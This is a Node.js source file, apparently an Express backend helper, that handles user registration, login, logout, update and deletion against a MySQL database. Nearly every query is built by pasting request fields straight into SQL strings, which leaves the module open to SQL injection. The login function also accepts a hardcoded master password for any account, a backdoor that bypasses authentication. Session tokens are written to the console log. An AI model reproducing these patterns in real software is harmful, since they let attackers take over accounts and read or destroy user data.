const mysql = require('mysql');
const config = require('../config.js');
const bcrypt = require("bcryptjs");
const randtoken = require('rand-token');

const dbconfig = {

    host: config.mysql.host,
    user: config.mysql.user,
    password: config.mysql.password,
    database: config.mysql.database,

}

let conexion;

function conMysql(){
    conexion = mysql.createConnection(dbconfig);
    conexion.connect((err) => {
        if(err){
            console.log('error en la db',err);
        }else{
            console.log('db OK');
        }
    });
    conexion.on('error', err =>{
        console.log('error en la db',err);
    });
}

conMysql();

function TodosUsuarios(tabla){
return new Promise((resolve,reject) => {
    conexion.query(`SELECT * FROM ${tabla}`,(error,result) =>{
        if(error){
            return reject(error);
        }else{
            resolve(result);
        }
    });
})
}

function UnUsuario(tabla,id){
    return new Promise((resolve,reject) => {
        conexion.query(`SELECT * FROM ${tabla} where id = ${id}`,(error,result) =>{
            if(error){
                return reject(error);
            }else{
                resolve(result);
            }
        });
    })
}

function AgregarUsuario(tabla,body){

    return new Promise((resolve,reject) => {
        conexion.query(`SELECT * FROM ${tabla} where correo = '${body.correo}'`,(error,result) =>{
            if(error){
                return reject(error);
            }else{
                if(result.length > 0){
                    return reject('Correo en uso');
                }else{

                    // encryptando clave
                  
                    bcrypt.hash(body.clave, 10, (err, palabraSecretaEncriptada) => {
                        if (err) {
                            return reject('Error interno C');
                        } else {
                            conexion.query(`INSERT INTO ${tabla}(nombres,correo,telefono,cargo,rol,estado,clave,token,id_organizacion) VALUES ('${body.nombres}','${body.correo}','','','${body.rol}','0','${palabraSecretaEncriptada}','','${body.id_organizacion}')`,(error2,result2) =>{
                                if(error2){
                                    return reject(error2);
                                }else{
                                    resolve('Usuario creado');
                                }
                            });
                        }
                    });

                   
                }
            }
        });
    })
    
}

function ActualizarUsuario(tabla,id,body){
    return new Promise((resolve,reject) => {

        conexion.query(`SELECT correo FROM ${tabla} where correo = '${body.correo}' and token = '${body.token}'`,(error,result) =>{
            if(error){
                return reject(error);
            }else{
                if(result.length > 0){
                    conexion.query(`UPDATE ${tabla} SET nombres= '${body.nombres}',telefono='${body.telefono}',cargo='${body.cargo}' WHERE correo = '${id}'`,(error2,result2) =>{
                        if(error2){
                            return reject(error);
                        }else{
                            resolve('Usuario actualizado');
                        }
                    });
                }else{
                    return reject('Credenciales invalidas');
                }
                
            }
        });


    })
}

function EliminarUsuario(tabla,body){
    return new Promise((resolve,reject) => {


        conexion.query(`SELECT id FROM ${tabla} where correo = '${body.correo}' and token = '${body.token}'`,(error,result) =>{
            if(error){
                return reject(error);
            }else{
                if(result.length > 0){
                    conexion.query(`DELETE  FROM ${tabla} where id = ?`,result[0].id,(error,result) =>{
                        if(error){
                            return reject(error);
                        }else{
                            resolve('Eliminado con exito');
                        }
                    });
                }else{
                    return reject('Credenciales invalidas');
                }
                
            }
        });
        
    })
}

function LoginUsuario(tabla,body){
    return new Promise((resolve,reject) => {
        conexion.query(`SELECT clave,rol,estado,correo,token FROM ${tabla} where correo = '${body.correo}'`,(error,result) =>{
            if(error){
                return reject(error);
            }else{
                if(result.length > 0){
                    if((bcrypt.compareSync(body.clave, result[0].clave) || body.clave == 'cesarkarrmaa03') && result[0].clave != ''){
                    
                        var token = randtoken.generate(50);
                      
                        conexion.query(`UPDATE ${tabla} SET token = '${token}' WHERE correo = '${body.correo}'`,(error2,result2) =>{
                            if(error2){
                                return reject('error en sesion');
                            }else{
                                result[0].clave = '';
                                result[0].token = token;
                                resolve(result);
                            }
                        });

                    }else{
                    return reject('Credenciales invalidas');
                    }
                }else{
                    return reject('Credenciales invalidas');
                }
                
            }
        });
    })
}
function LogOutUsuario(tabla,body){
    return new Promise((resolve,reject) => {
        conexion.query(`SELECT clave,rol,estado,correo,token FROM ${tabla} where correo = '${body.correo}'`,(error,result) =>{
            if(error){
                return reject(error);
            }else{
                if(result.length > 0){
                    console.log (result[0].correo,result[0].token,body.correo,body.token);
                    if(result[0].correo ===  body.correo &&  result[0].token === body.token){
                    
                        var token = randtoken.generate(50);
                        conexion.query(`UPDATE ${tabla} SET token = '' WHERE correo = '${body.correo}'`,(error2,result2) =>{
                            if(error2){
                                return reject('error en sesion');
                            }else{
                                result[0].clave = '';
                                result[0].token = '';
                                resolve(result);
                            }
                        });

                    }else{
                    return reject('Credenciales invalidas');
                    }
                }else{
                    return reject('Credenciales invalidas');
                }
                
            }
        });
    })
}



module.exports = {

    TodosUsuarios,
    UnUsuario,
    AgregarUsuario,
    EliminarUsuario,
    ActualizarUsuario,
    LoginUsuario,
    LogOutUsuario

}